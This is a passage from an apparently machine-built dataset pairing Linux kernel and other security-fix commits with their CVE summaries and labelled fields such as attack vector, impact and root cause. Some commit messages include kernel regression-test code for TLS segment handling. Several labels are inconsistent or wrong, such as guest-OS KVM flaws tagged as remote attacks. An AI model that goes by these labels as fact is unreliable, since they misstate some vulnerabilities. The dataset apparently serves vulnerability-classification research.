could still be registered in khugepaged (despite\nanon_vma was not NULL to be registered in khugepaged) was too paranoid.\nThe is_linear_pfn_mapping check is also I think superfluous (as described\nby comment) but under DEBUG_VM it is safe to stay.\n\nAddresses https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=33682\n\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nReported-by: Caspar Zhang <bugs@casparzhang.com>\nAcked-by: Mel Gorman <mel@csn.ul.ie>\nAcked-by: Rik van Riel <riel@redhat.com>\nCc: <stable@kernel.org>\t\t[2.6.38.x]\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 2.6.39 does not properly create transparent huge pages in response to a MAP_PRIVATE mmap system call on \/dev\/zero, which allows local users to cause a denial of service (system crash) via a crafted application.","commit_message_1":"thp : fix \/dev\/zero map_private and vm_flags cleanup the <file> thp page fault wa allowed to run if vm_ops wa null ( which would succeed for \/dev\/zero map_private , a the f_op- > mmap would n't setup a special vma- > vm_ops and it would fallback to regular anonymous memory ) but other thp logic were n't fully activated for vmas with vm_file not null ( \/dev\/zero ha a not null vma- > vm_file )","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly create transparent huge pages","Attack Type":"local attacker"},{"commit_id":"4ff67b720c02c36e54d55b88c2931879b7db1cd2","cve_id":"CVE-2011-1585","cwe_id":"CWE-264","commit_message":"cifs: clean up cifs_find_smb_ses (try #2)\n\nThis patch replaces the earlier patch by the same name. The only\ndifference is that MAX_PASSWORD_SIZE has been increased to attempt to\nmatch the limits that windows enforces.\n\nDo a better job of matching sessions by authtype. Matching by username\nfor a Kerberos session is incorrect, and anonymous sessions need special\nhandling.\n\nAlso, in the case where we do match by username, we also need to match\nby password. That ensures that someone else doesn't \"borrow\" an existing\nsession without needing to know the password.\n\nFinally, passwords can be longer than 16 bytes. Bump MAX_PASSWORD_SIZE\nto 512 to match the size that the userspace mount helper allows.\n\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>","summary":"The cifs_find_smb_ses function in fs\/cifs\/connect.c in the Linux kernel before 2.6.36 does not properly determine the associations between users and sessions, which allows local users to bypass CIFS share authentication by leveraging a mount of a share by a different user.","commit_message_1":"clean up cifs_find_smb_ses ( try # <number> ) this patch replaces the earlier patch by the same name","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging a mount of a share by a different user","Impact":"bypass cifs share authentication","Root Cause":"does not properly determine the associations between users and sessions","Attack Type":"local attacker"},{"commit_id":"da48524eb20662618854bb3df2db01fc65f3070c","cve_id":"CVE-2011-1182","cwe_id":null,"commit_message":"Prevent rt_sigqueueinfo and rt_tgsigqueueinfo from spoofing the signal code\n\nUserland should be able to trust the pid and uid of the sender of a\nsignal if the si_code is SI_TKILL.\n\nUnfortunately, the kernel has historically allowed sigqueueinfo() to\nsend any si_code at all (as long as it was negative - to distinguish it\nfrom kernel-generated signals like SIGILL etc), so it could spoof a\nSI_TKILL with incorrect siginfo values.\n\nHappily, it looks like glibc has always set si_code to the appropriate\nSI_QUEUE, so there are probably no actual user code that ever uses\nanything but the appropriate SI_QUEUE flag.\n\nSo just tighten the check for si_code (we used to allow any negative\nvalue), and add a (one-time) warning in case there are binaries out\nthere that might depend on using other si_code values.\n\nSigned-off-by: Julien Tinnes <jln@google.com>\nAcked-by: Oleg Nesterov <oleg@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"kernel\/signal.c in the Linux kernel before 2.6.39 allows local users to spoof the uid and pid of a signal sender via a sigqueueinfo system call.","commit_message_1":"prevent rt_sigqueueinfo and rt_tgsigqueueinfo from spoofing the signal code userland should be able to trust the pid and uid of the sender of a signal if the si_code is si_tkill","Vulnerability Type":"via a sigqueueinfo system call","Attack Vector":"via a sigqueueinfo system call ","Impact":"spoof the uid and pid of a signal sender","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"d370af0ef7951188daeb15bae75db7ba57c67846","cve_id":"CVE-2011-1180","cwe_id":"CWE-119","commit_message":"irda: validate peer name and attribute lengths\n\nLength fields provided by a peer for names and attributes may be longer\nthan the destination array sizes.  Validate lengths to prevent stack\nbuffer overflows.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable@kernel.org\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Multiple stack-based buffer overflows in the iriap_getvaluebyclass_indication function in net\/irda\/iriap.c in the Linux kernel before 2.6.39 allow remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging connectivity to an IrDA infrared network and sending a large integer value for a (1) name length or (2) attribute length.","commit_message_1":"validate peer name and attribute length length field provided by a peer for name and attribute may be longer than the destination array size","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging connectivity to an irda infrared network and sending a large integer value for a ( 1 ) name length or ( 2 ) attribute length","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by iriap.c","Attack Type":"remote attacker"},{"commit_id":"8909c9ad8ff03611c9c96c9a92656213e4bb495b","cve_id":"CVE-2011-1019","cwe_id":"CWE-264","commit_message":"net: don't allow CAP_NET_ADMIN to load non-netdev kernel modules\n\nSince a8f80e8ff94ecba629542d9b4b5f5a8ee3eb565c any process with\nCAP_NET_ADMIN may load any module from \/lib\/modules\/.  This doesn't mean\nthat CAP_NET_ADMIN is a superset of CAP_SYS_MODULE as modules are\nlimited to \/lib\/modules\/**.  However, CAP_NET_ADMIN capability shouldn't\nallow anybody load any module not related to networking.\n\nThis patch restricts an ability of autoloading modules to netdev modules\nwith explicit aliases.  This fixes CVE-2011-1019.\n\nArnd Bergmann suggested to leave untouched the old pre-v2.6.32 behavior\nof loading netdev modules by name (without any prefix) for processes\nwith CAP_SYS_MODULE to maintain the compatibility with network scripts\nthat use autoloading netdev modules by aliases like \"eth0\", \"wlan0\".\n\nCurrently there are only three users of the feature in the upstream\nkernel: ipip, ip_gre and sit.\n\n    root@albatros:~# capsh --drop=$(seq -s, 0 11),$(seq -s, 13 34) --\n    root@albatros:~# grep Cap \/proc\/$$\/status\n    CapInh:\t0000000000000000\n    CapPrm:\tfffffff800001000\n    CapEff:\tfffffff800001000\n    CapBnd:\tfffffff800001000\n    root@albatros:~# modprobe xfs\n    FATAL: Error inserting xfs\n    (\/lib\/modules\/2.6.38-rc6-00001-g2bf4ca3\/kernel\/fs\/xfs\/xfs.ko): Operation not permitted\n    root@albatros:~# lsmod | grep xfs\n    root@albatros:~# ifconfig xfs\n    xfs: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep xfs\n    root@albatros:~# lsmod | grep sit\n    root@albatros:~# ifconfig sit\n    sit: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep sit\n    root@albatros:~# ifconfig sit0\n    sit0      Link encap:IPv6-in-IPv4\n\t      NOARP  MTU:1480  Metric:1\n\n    root@albatros:~# lsmod | grep sit\n    sit                    10457  0\n    tunnel4                 2957  1 sit\n\nFor CAP_SYS_MODULE module loading is still relaxed:\n\n    root@albatros:~# grep Cap \/proc\/$$\/status\n    CapInh:\t0000000000000000\n    CapPrm:\tffffffffffffffff\n    CapEff:\tffffffffffffffff\n    CapBnd:\tffffffffffffffff\n    root@albatros:~# ifconfig xfs\n    xfs: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep xfs\n    xfs                   745319  0\n\nReference: https:\/\/lkml.org\/lkml\/2011\/2\/24\/203\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Michael Tokarev <mjt@tls.msk.ru>\nAcked-by: David S. Miller <davem@davemloft.net>\nAcked-by: Kees Cook <kees.cook@canonical.com>\nSigned-off-by: James Morris <jmorris@namei.org>","summary":"The dev_load function in net\/core\/dev.c in the Linux kernel before 2.6.38 allows local users to bypass an intended CAP_SYS_MODULE capability requirement and load arbitrary modules by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"do n't allow cap_net_admin to load non-netdev kernel module since a8f80e8ff94ecba629542d9b4b5f5a8ee3eb565c any process with cap_net_admin may load any module from \/lib\/modules\/","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"bypass an intended cap _ sys _ module capability requirement and load arbitrary modules","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"cf1a0c411b2668c57c41e9c4efd15ba17b6b322c","cve_id":"CVE-2002-2443","cwe_id":"CWE-20","commit_message":"Fix kpasswd UDP ping-pong [CVE-2002-2443]\n\nThe kpasswd service provided by kadmind was vulnerable to a UDP\n\"ping-pong\" attack [CVE-2002-2443].  Don't respond to packets unless\nthey pass some basic validation, and don't respond to our own error\npackets.\n\nSome authors use CVE-1999-0103 to refer to the kpasswd UDP ping-pong\nattack or UDP ping-pong attacks in general, but there is discussion\nleading toward narrowing the definition of CVE-1999-0103 to the echo,\nchargen, or other similar built-in inetd services.\n\nThanks to Vincent Danen for alerting us to this issue.\n\nCVSSv2: AV:N\/AC:L\/Au:N\/C:N\/I:N\/A:P\/E:P\/RL:O\/RC:C\n\nticket: 7637 (new)\ntarget_version: 1.11.3\ntags: pullup","summary":"schpw.c in the kpasswd service in kadmind in MIT Kerberos 5 (aka krb5) before 1.11.3 does not properly validate UDP packets before sending responses, which allows remote attackers to cause a denial of service (CPU and bandwidth consumption) via a forged packet that triggers a communication loop, as demonstrated by krb_pingpong.nasl, a related issue to CVE-1999-0103.","commit_message_1":"fix kpasswd udp ping-pong [ <cve_id> ] the kpasswd service provided by kadmind wa vulnerable to a udp '' ping-pong '' attack [ <cve_id> ]","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a forged packet that triggers a communication loop , as demonstrated by krb _ pingpong . nasl , a related issue to cve - 1999 - 0103","Impact":"cause a denial of service ( cpu and bandwidth consumption )","Root Cause":"does not properly validate udp packets before sending responses","Attack Type":"remote attacker"},{"commit_id":"f54e18f1b831c92f6512d2eedb224cd63d607d3d","cve_id":"CVE-2014-9420","cwe_id":"CWE-399","commit_message":"isofs: Fix infinite looping over CE entries\n\nRock Ridge extensions define so called Continuation Entries (CE) which\ndefine where is further space with Rock Ridge data. Corrupted isofs\nimage can contain arbitrarily long chain of these, including a one\ncontaining loop and thus causing kernel to end in an infinite loop when\ntraversing these entries.\n\nLimit the traversal to 32 entries which should be more than enough space\nto store all the Rock Ridge data.\n\nReported-by: P J P <ppandit@redhat.com>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The rock_continue function in fs\/isofs\/rock.c in the Linux kernel through 3.18.1 does not restrict the number of Rock Ridge continuation entries, which allows local users to cause a denial of service (infinite loop, and system crash or hang) via a crafted iso9660 image.","commit_message_1":"fix infinite looping over ce entry rock ridge extension define so called continuation entry ( ce ) which define where is further space with rock ridge data","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted iso9660 image","Impact":"cause a denial of service ( infinite loop , and system crash or hang )","Root Cause":"does not restrict the number of rock ridge continuation entries","Attack Type":"local attacker"},{"commit_id":"f647d7c155f069c1a068030255c300663516420e","cve_id":"CVE-2014-9419","cwe_id":"CWE-200","commit_message":"x86_64, switch_to(): Load TLS descriptors before switching DS and ES\n\nOtherwise, if buggy user code points DS or ES into the TLS\narray, they would be corrupted after a context switch.\n\nThis also significantly improves the comments and documents some\ngotchas in the code.\n\nBefore this patch, the both tests below failed.  With this\npatch, the es test passes, although the gsbase test still fails.\n\n ----- begin es test -----\n\n\/*\n * Copyright (c) 2014 Andy Lutomirski\n * GPL v2\n *\/\n\nstatic unsigned short GDT3(int idx)\n{\n\treturn (idx << 3) | 3;\n}\n\nstatic int create_tls(int idx, unsigned int base)\n{\n\tstruct user_desc desc = {\n\t\t.entry_number    = idx,\n\t\t.base_addr       = base,\n\t\t.limit           = 0xfffff,\n\t\t.seg_32bit       = 1,\n\t\t.contents        = 0, \/* Data, grow-up *\/\n\t\t.read_exec_only  = 0,\n\t\t.limit_in_pages  = 1,\n\t\t.seg_not_present = 0,\n\t\t.useable         = 0,\n\t};\n\n\tif (syscall(SYS_set_thread_area, &desc) != 0)\n\t\terr(1, \"set_thread_area\");\n\n\treturn desc.entry_number;\n}\n\nint main()\n{\n\tint idx = create_tls(-1, 0);\n\tprintf(\"Allocated GDT index %d\\n\", idx);\n\n\tunsigned short orig_es;\n\tasm volatile (\"mov %%es,%0\" : \"=rm\" (orig_es));\n\n\tint errors = 0;\n\tint total = 1000;\n\tfor (int i = 0; i < total; i++) {\n\t\tasm volatile (\"mov %0,%%es\" : : \"rm\" (GDT3(idx)));\n\t\tusleep(100);\n\n\t\tunsigned short es;\n\t\tasm volatile (\"mov %%es,%0\" : \"=rm\" (es));\n\t\tasm volatile (\"mov %0,%%es\" : : \"rm\" (orig_es));\n\t\tif (es != GDT3(idx)) {\n\t\t\tif (errors == 0)\n\t\t\t\tprintf(\"[FAIL]\\tES changed from 0x%hx to 0x%hx\\n\",\n\t\t\t\t       GDT3(idx), es);\n\t\t\terrors++;\n\t\t}\n\t}\n\n\tif (errors) {\n\t\tprintf(\"[FAIL]\\tES was corrupted %d\/%d times\\n\", errors, total);\n\t\treturn 1;\n\t} else {\n\t\tprintf(\"[OK]\\tES was preserved\\n\");\n\t\treturn 0;\n\t}\n}\n\n ----- end es test -----\n\n ----- begin gsbase test -----\n\n\/*\n * gsbase.c, a gsbase test\n * Copyright (c) 2014 Andy Lutomirski\n * GPL v2\n *\/\n\nstatic unsigned char *testptr, *testptr2;\n\nstatic unsigned char read_gs_testvals(void)\n{\n\tunsigned char ret;\n\tasm volatile (\"movb %%gs:%1, %0\" : \"=r\" (ret) : \"m\" (*testptr));\n\treturn ret;\n}\n\nint main()\n{\n\tint errors = 0;\n\n\ttestptr = mmap((void *)0x200000000UL, 1, PROT_READ | PROT_WRITE,\n\t\t       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);\n\tif (testptr == MAP_FAILED)\n\t\terr(1, \"mmap\");\n\n\ttestptr2 = mmap((void *)0x300000000UL, 1, PROT_READ | PROT_WRITE,\n\t\t       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);\n\tif (testptr2 == MAP_FAILED)\n\t\terr(1, \"mmap\");\n\n\t*testptr = 0;\n\t*testptr2 = 1;\n\n\tif (syscall(SYS_arch_prctl, ARCH_SET_GS,\n\t\t    (unsigned long)testptr2 - (unsigned long)testptr) != 0)\n\t\terr(1, \"ARCH_SET_GS\");\n\n\tusleep(100);\n\n\tif (read_gs_testvals() == 1) {\n\t\tprintf(\"[OK]\\tARCH_SET_GS worked\\n\");\n\t} else {\n\t\tprintf(\"[FAIL]\\tARCH_SET_GS failed\\n\");\n\t\terrors++;\n\t}\n\n\tasm volatile (\"mov %0,%%gs\" : : \"r\" (0));\n\n\tif (read_gs_testvals() == 0) {\n\t\tprintf(\"[OK]\\tWriting 0 to gs worked\\n\");\n\t} else {\n\t\tprintf(\"[FAIL]\\tWriting 0 to gs failed\\n\");\n\t\terrors++;\n\t}\n\n\tusleep(100);\n\n\tif (read_gs_testvals() == 0) {\n\t\tprintf(\"[OK]\\tgsbase is still zero\\n\");\n\t} else {\n\t\tprintf(\"[FAIL]\\tgsbase was corrupted\\n\");\n\t\terrors++;\n\t}\n\n\treturn errors == 0 ? 0 : 1;\n}\n\n ----- end gsbase test -----\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nCc: <stable@vger.kernel.org>\nCc: Andi Kleen <andi@firstfloor.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nLink: http:\/\/lkml.kernel.org\/r\/509d27c9fec78217691c3dad91cec87e1006b34a.1418075657.git.luto@amacapital.net\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"The __switch_to function in arch\/x86\/kernel\/process_64.c in the Linux kernel through 3.18.1 does not ensure that Thread Local Storage (TLS) descriptors are loaded before proceeding with other steps, which makes it easier for local users to bypass the ASLR protection mechanism via a crafted application that reads a TLS base address.","commit_message_1":"load tl descriptor before switching d and e otherwise , if buggy user code point d or e into the tl array , they would be corrupted after a context switch","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application that reads a tls base address","Impact":"bypass the aslr protection mechanism","Root Cause":"does not ensure that thread local storage ( tls ) descriptors are loaded before proceeding with other steps","Attack Type":"local attacker"},{"commit_id":"a766cb44bcffcdb0b88e776d01c5ee1323d44f85","cve_id":"CVE-2014-9351","cwe_id":"CWE-20","commit_message":"fixed a server crash","summary":"engine\/server\/server.cpp in Teeworlds 0.6.x before 0.6.3 allows remote attackers to read memory and cause a denial of service (crash) via unspecified vectors.","commit_message_1":"fixed a server crash","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unspecified vectors","Impact":"read memory and cause a denial of service ( crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"6f442be2fb22be02cafa606f1769fa1e6f894441","cve_id":"CVE-2014-9322","cwe_id":"CWE-264","commit_message":"x86_64, traps: Stop using IST for #SS\n\nOn a 32-bit kernel, this has no effect, since there are no IST stacks.\n\nOn a 64-bit kernel, #SS can only happen in user code, on a failed iret\nto user space, a canonical violation on access via RSP or RBP, or a\ngenuine stack segment violation in 32-bit kernel code.  The first two\ncases don't need IST, and the latter two cases are unlikely fatal bugs,\nand promoting them to double faults would be fine.\n\nThis fixes a bug in which the espfix64 code mishandles a stack segment\nviolation.\n\nThis saves 4k of memory per CPU and a tiny bit of code.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nReviewed-by: Thomas Gleixner <tglx@linutronix.de>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"arch\/x86\/kernel\/entry_64.S in the Linux kernel before 3.17.5 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space.","commit_message_1":"stop using ist for # s on a <number>-bit kernel , this ha no effect , since there are no ist stack","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by triggering an iret instruction that leads to access to a gs base address from the wrong space","Impact":"gain privileges","Root Cause":"does not properly handle faults associated with the stack segment ( ss ) segment register","Attack Type":"local attacker"},{"commit_id":"0f95d441e4b5d7512cc5c326c8668a120e048eda","cve_id":"CVE-2014-9140","cwe_id":"CWE-119","commit_message":"Do bounds checking when unescaping PPP.\n\nClean up a const issue while we're at it.","summary":"Buffer overflow in the ppp_hdlc function in print-ppp.c in tcpdump 4.6.2 and earlier allows remote attackers to cause a denial of service (crash) cia a crafted PPP packet.","commit_message_1":"do bound checking when unescaping ppp","Vulnerability Type":"buffer overflow","Attack Vector":"By sending an overly long argument","Impact":"cause a denial of service ( crash ) cia a crafted ppp packet","Root Cause":"caused by improper bounds checking by the PPP dissector","Attack Type":"remote attacker"},{"commit_id":"fc3794a54d2affe5770c1f876484a871c783e91e","cve_id":"CVE-2014-9050","cwe_id":"CWE-119","commit_message":"Merge fix from security\/bb11155 branch","summary":"Heap-based buffer overflow in the cli_scanpe function in libclamav\/pe.c in ClamAV before 0.98.5 allows remote attackers to cause a denial of service (crash) via a crafted y0da Crypter PE file.","commit_message_1":"merge fix from security\/bb11155 branch","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted y0da crypter pe file ","Impact":"cause a denial of service ( crash )","Root Cause":"caused by improper bounds checking by the libclamav\/pe.c file","Attack Type":"remote attacker"},{"commit_id":"f2e323ec96077642d397bb1c355def536d489d16","cve_id":"CVE-2014-8884","cwe_id":"CWE-119","commit_message":"[media] ttusb-dec: buffer overflow in ioctl\n\nWe need to add a limit check here so we don't overflow the buffer.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>","summary":"Stack-based buffer overflow in the ttusbdecfe_dvbs_diseqc_send_master_cmd function in drivers\/media\/usb\/ttusb-dec\/ttusbdecfe.c in the Linux kernel before 3.17.4 allows local users to cause a denial of service (system crash) or possibly gain privileges via a large message length in an ioctl call.","commit_message_1":"buffer overflow in ioctl we need to add a limit check here so we do n't overflow the buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via a large message length in an ioctl call","Impact":"cause a denial of service ( system crash ) or possibly gain privileges to","Root Cause":"caused by improper bounds checking by the ttusbdecfe.c DVB-T usb driver","Attack Type":"local attacker"},{"commit_id":"338f977f4eb441e69bb9a46eaa0ac715c931a67f","cve_id":"CVE-2014-8709","cwe_id":"CWE-200","commit_message":"mac80211: fix fragmentation code, particularly for encryption\n\nThe \"new\" fragmentation code (since my rewrite almost 5 years ago)\nerroneously sets skb->len rather than using skb_trim() to adjust\nthe length of the first fragment after copying out all the others.\nThis leaves the skb tail pointer pointing to after where the data\noriginally ended, and thus causes the encryption MIC to be written\nat that point, rather than where it belongs: immediately after the\ndata.\n\nThe impact of this is that if software encryption is done, then\n a) encryption doesn't work for the first fragment, the connection\n    becomes unusable as the first fragment will never be properly\n    verified at the receiver, the MIC is practically guaranteed to\n    be wrong\n b) we leak up to 8 bytes of plaintext (!) of the packet out into\n    the air\n\nThis is only mitigated by the fact that many devices are capable\nof doing encryption in hardware, in which case this can't happen\nas the tail pointer is irrelevant in that case. Additionally,\nfragmentation is not used very frequently and would normally have\nto be configured manually.\n\nFix this by using skb_trim() properly.\n\nCc: stable@vger.kernel.org\nFixes: 2de8e0d999b8 (\"mac80211: rewrite fragmentation\")\nReported-by: Jouni Malinen <j@w1.fi>\nSigned-off-by: Johannes Berg <johannes.berg@intel.com>","summary":"The ieee80211_fragment function in net\/mac80211\/tx.c in the Linux kernel before 3.13.5 does not properly maintain a certain tail pointer, which allows remote attackers to obtain sensitive cleartext information by reading packets.","commit_message_1":"fix fragmentation code , particularly for encryption the `` new '' fragmentation code ( since my rewrite almost <number> year ago ) erroneously set skb- > len rather than using skb_trim ( ) to adjust the length of the first fragment after copying out all the others","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading packets","Impact":"obtain sensitive cleartext information","Root Cause":"does not properly maintain a certain tail pointer","Attack Type":"remote attacker"},{"commit_id":"bbc0b7191e3f48461ca6e5b1b34bdf4b3f1e79a9","cve_id":"CVE-2014-8509","cwe_id":"CWE-119","commit_message":"update version of lazy_bdecode from libtorrent","summary":"The lazy_bdecode function in BitTorrent bootstrap-dht (aka Bootstrap) allows remote attackers to execute arbitrary code via a crafted packet, which triggers an out-of-bounds read, related to *Improper Indexing.*","commit_message_1":"update version of lazy_bdecode from libtorrent","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted packet , which triggers an out - of - bounds read , related to * improper indexing","Impact":"execute arbitrary code","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"8b5ecd226f9208af3074b33d3b7cf5e14f55b138","cve_id":"CVE-2014-8483","cwe_id":"CWE-125","commit_message":"Check for invalid input in encrypted buffers\n\nThe ECB Blowfish decryption function assumed that encrypted input would\nalways come in blocks of 12 characters, as specified. However, buggy\nclients or annoying people may not adhere to that assumption, causing\nthe core to crash while trying to process the invalid base64 input.\n\nWith this commit we make sure that we're not overstepping the bounds of\nthe input string while decoding it; instead we bail out early and display\nthe original input. Fixes #1314.\n\nThanks to Tucos for finding that one!","summary":"The blowfishECB function in core\/cipher.cpp in Quassel IRC 0.10.0 allows remote attackers to cause a denial of service (out-of-bounds read) via a malformed string.","commit_message_1":"check for invalid input in encrypted buffer the ecb blowfish decryption function assumed that encrypted input would always come in block of <number> character , a specified","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a malformed string","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"a430c9166312e1aa3d80bce32374233bdbfeba32","cve_id":"CVE-2014-8481","cwe_id":"CWE-399","commit_message":"KVM: emulate: avoid accessing NULL ctxt->memopp\n\nA failure to decode the instruction can cause a NULL pointer access.\nThis is fixed simply by moving the \"done\" label as close as possible\nto the return.\n\nThis fixes CVE-2014-8481.\n\nReported-by: Andy Lutomirski <luto@amacapital.net>\nCc: stable@vger.kernel.org\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The instruction decoder in arch\/x86\/kvm\/emulate.c in the KVM subsystem in the Linux kernel before 3.18-rc2 does not properly handle invalid instructions, which allows guest OS users to cause a denial of service (NULL pointer dereference and host OS crash) via a crafted application that triggers (1) an improperly fetched instruction or (2) an instruction that occupies too many bytes.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2014-8480.","commit_message_1":"emulate : avoid accessing null ctxt- > memopp a failure to decode the instruction can cause a null pointer access","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application that triggers an improperly fetched instruction or an instruction that occupies too many bytes","Impact":"cause a denial of service ( pointer dereference and host os crash )","Root Cause":"does not properly handle invalid instructions","Attack Type":"remote attacker"},{"commit_id":"3f6f1480d86bf9fc16c160d803ab1d006e3058d5","cve_id":"CVE-2014-8480","cwe_id":"CWE-399","commit_message":"KVM: x86: PREFETCH and HINT_NOP should have SrcMem flag\n\nThe decode phase of the x86 emulator assumes that every instruction with the\nModRM flag, and which can be used with RIP-relative addressing, has either\nSrcMem or DstMem.  This is not the case for several instructions - prefetch,\nhint-nop and clflush.\n\nAdding SrcMem|NoAccess for prefetch and hint-nop and SrcMem for clflush.\n\nThis fixes CVE-2014-8480.\n\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The instruction decoder in arch\/x86\/kvm\/emulate.c in the KVM subsystem in the Linux kernel before 3.18-rc2 lacks intended decoder-table flags for certain RIP-relative instructions, which allows guest OS users to cause a denial of service (NULL pointer dereference and host OS crash) via a crafted application.","commit_message_1":"x86 : prefetch and hint_nop should have srcmem flag the decode phase of the x86 emulator assumes that every instruction with the modrm flag , and which can be used with rip-relative addressing , ha either srcmem or dstmem","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( pointer dereference and host os crash )","Root Cause":"lacks intended decoder - table flags for certain rip - relative instructions","Attack Type":"remote attacker"},{"commit_id":"3d32e4dbe71374a6780eaf51d719d76f9a9bf22f","cve_id":"CVE-2014-8369","cwe_id":"CWE-189","commit_message":"kvm: fix excessive pages un-pinning in kvm_iommu_map error path.\n\nThe third parameter of kvm_unpin_pages() when called from\nkvm_iommu_map_pages() is wrong, it should be the number of pages to un-pin\nand not the page size.\n\nThis error was facilitated with an inconsistent API: kvm_pin_pages() takes\na size, but kvn_unpin_pages() takes a number of pages, so fix the problem\nby matching the two.\n\nThis was introduced by commit 350b8bd (\"kvm: iommu: fix the third parameter\nof kvm_iommu_put_pages (CVE-2014-3601)\"), which fixes the lack of\nun-pinning for pages intended to be un-pinned (i.e. memory leak) but\nunfortunately potentially aggravated the number of pages we un-pin that\nshould have stayed pinned. As far as I understand though, the same\npractical mitigations apply.\n\nThis issue was found during review of Red Hat 6.6 patches to prepare\nKsplice rebootless updates.\n\nThanks to Vegard for his time on a late Friday evening to help me in\nunderstanding this code.\n\nFixes: 350b8bd (\"kvm: iommu: fix the third parameter of... (CVE-2014-3601)\")\nCc: stable@vger.kernel.org\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>\nSigned-off-by: Vegard Nossum <vegard.nossum@oracle.com>\nSigned-off-by: Jamie Iles <jamie.iles@oracle.com>\nReviewed-by: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The kvm_iommu_map_pages function in virt\/kvm\/iommu.c in the Linux kernel through 3.17.2 miscalculates the number of pages during the handling of a mapping failure, which allows guest OS users to cause a denial of service (host OS page unpinning) or possibly have unspecified other impact by leveraging guest OS privileges.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2014-3601.","commit_message_1":"fix excessive page un-pinning in kvm_iommu_map error path","Vulnerability Type":"Numeric Errors","Attack Vector":"by leveraging guest os privileges","Impact":"cause a denial of service ( host os page unpinning ) or possibly have unspecified other impact","Root Cause":"miscalculates the number of pages during the handling of a mapping failure","Attack Type":"remote attacker"},{"commit_id":"41bdc78544b8a93a9c6814b8bbbfef966272abbe","cve_id":"CVE-2014-8133","cwe_id":"CWE-264","commit_message":"x86\/tls: Validate TLS entries to protect espfix\n\nInstalling a 16-bit RW data segment into the GDT defeats espfix.\nAFAICT this will not affect glibc, Wine, or dosemu at all.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nAcked-by: H. Peter Anvin <hpa@zytor.com>\nCc: stable@vger.kernel.org\nCc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: security@kernel.org <security@kernel.org>\nCc: Willy Tarreau <w@1wt.eu>\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"arch\/x86\/kernel\/tls.c in the Thread Local Storage (TLS) implementation in the Linux kernel through 3.18.1 allows local users to bypass the espfix protection mechanism, and consequently makes it easier for local users to bypass the ASLR protection mechanism, via a crafted application that makes a set_thread_area system call and later reads a 16-bit value.","commit_message_1":"validate tl entry to protect espfix installing a <number>-bit rw data segment into the gdt defeat espfix","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application that makes a set _ thread _ area system call and later reads a 16 - bit 